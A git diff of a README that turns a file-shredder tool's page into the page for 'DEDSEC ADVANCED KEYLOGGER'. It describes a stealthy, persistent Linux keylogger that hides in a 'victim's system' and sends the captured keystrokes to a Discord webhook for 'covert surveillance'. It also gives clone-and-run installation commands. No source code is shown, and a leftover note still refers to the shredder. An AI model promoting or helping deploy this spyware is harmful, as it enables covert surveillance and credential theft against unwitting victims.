@@ -5,41 +5,32 @@
 </p>
 
 <h1 align="center"> DEDSEC ADVANCED KEYLOGGER </h1>
-<h4 align="center">KEYLOGGER is a Linux-based tool for securely erasing files and directories, ensuring data irrecoverability. It offers customizable passes for overwriting data and provides visual feedback during the shredding process. Perfect for sensitive data disposal with peace of mind.</h4>
+<h4 align="center">KEYLOGGER is a Linux-based tool designed for discreetly capturing keystrokes.</h4>
 
 
 ### DESCRIPTION
 
-DEDSEC_SHRED is a powerful data security tool designed to securely erase sensitive files and directories from your system, ensuring that the data is irrecoverable. This tool implements advanced data shredding techniques to overwrite the contents of files and directories multiple times with pseudorandom data generated using cryptographic hashing algorithms.
-
+KEYLOGGER is a Linux-based tool designed for discreetly capturing keystrokes, providing users with a stealthy payload capable of hiding within a victim's system. It boasts persistence capabilities, ensuring continuous operation. Captured keystrokes are encrypted for security and seamlessly transmitted to a designated Discord webhook. This tool guarantees data confidentiality and integrity, making it ideal for covert surveillance and monitoring purposes.
 
 ### Features:
-
-   * Secure File Shredding: DEDSEC_SHRED allows you to securely erase individual files by overwriting their contents multiple times with pseudorandom data, making it virtually impossible to recover the original data.
+  * Stealth Payload: Operates discreetly within the victim's system, minimizing detection.
+  
+  * Persistent Payload: Maintains continuous operation across system reboots or shutdowns.
+  
+  * Custom Template Payload: Offers flexibility with customizable payload templates for tailored deployment.
     
-   * Directory Erasure: With DEDSEC_SHRED, you can securely erase entire directories and their contents. The tool recursively traverses the directory structure, securely erasing files and subdirectories within the specified directory.
-    
-   * Customizable Passes: You can configure the number of passes for overwriting data, allowing you to adjust the level of security based on your specific requirements.
-    
-   * Terminal-Based Interface: DEDSEC_SHRED provides a user-friendly terminal-based interface, making it easy to use and integrate into your workflow.
-    
-   * Visual Feedback: The tool offers visual feedback during the shredding process, providing clear indications of the progress and status of each file and directory being securely erased.
-
 ### Usage:
-
-   * Run the DEDSEC_SHRED tool from the terminal.
-   * Enter the file or directory path you want to securely erase.
-   * Optionally, specify the number of passes for overwriting data (default is 3).
-   * Sit back and let DEDSEC_SHRED securely erase your sensitive data, providing peace of mind that it cannot be recovered.
+   * Run the dedsec_keylogger tool from the terminal.
+   * setup your webhook link.
 
 > [!NOTE]
 > DEDSEC_SHRED is intended for use in situations where data security is paramount, such as securely deleting confidential documents, personal files, or decommissioning storage devices.
 
 ### INSTALLATION
-    * git clone https://github.com/0xbitx/DEDSEC_SHRED.git
-    * cd DEDSEC_SHRED
-    * chmod +x dedsec_shred
-    * ./dedsec_shred
+    * git clone https://github.com/0xbitx/DEDSEC_KEYLOGGER.git
+    * cd DEDSEC_KEYLOGGER
+    * chmod +x dedsec_keylogger
+    * ./dedsec_keylogger
 
 ### TESTED ON FOLLOWING
 * Kali Linux 
